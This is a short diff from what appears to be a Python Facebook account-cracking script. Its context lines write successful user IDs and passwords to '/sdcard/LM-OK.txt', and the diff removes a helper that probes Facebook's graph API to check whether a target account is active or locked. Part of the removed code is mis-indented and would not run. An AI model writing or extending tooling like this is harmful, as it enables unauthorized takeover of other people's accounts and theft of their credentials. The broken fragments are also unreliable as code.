@@ -493,20 +493,6 @@ def c(uid,pwx,tl):
                 open('/sdcard/LM-OK.txt', 'a').write(cid+' | '+ps+'\n')
                 break
                 
-def lock(uid):
-        req = str(requests.get(f'https://graph.facebook.com/{uid}/picture?type=normal').text)
-        if 'Photoshop' in req:
-            return 'Active'
-        else:
-            return 'Locked'
-
-
-         uid = ""
-         status= lock(uid)
-         if "Active" in status:
-         print ("ok id ")
-            else:
-                continue
         loop+=1        
     except:
         pass
